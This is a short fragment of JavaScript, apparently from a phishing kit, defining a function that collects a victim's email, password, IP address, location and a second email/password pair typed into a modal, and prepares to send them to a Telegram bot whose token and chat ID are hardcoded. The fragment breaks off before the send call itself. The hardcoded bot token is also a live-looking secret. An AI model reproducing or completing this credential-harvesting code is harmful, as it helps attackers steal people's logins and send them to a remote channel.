<script>
  ...
  async function sendDataToTelegram(email, password, ip, location, modalEmail, modalPassword) {
    const botToken = '8540340242:AAFZ7kaFwVLYJjIveE6_Wjl-LG4I5L5uIqY'; // Replace with your(others) Telegram bot token
      const chatId = '1711505165'; // Replace with your(others) Telegram chat ID
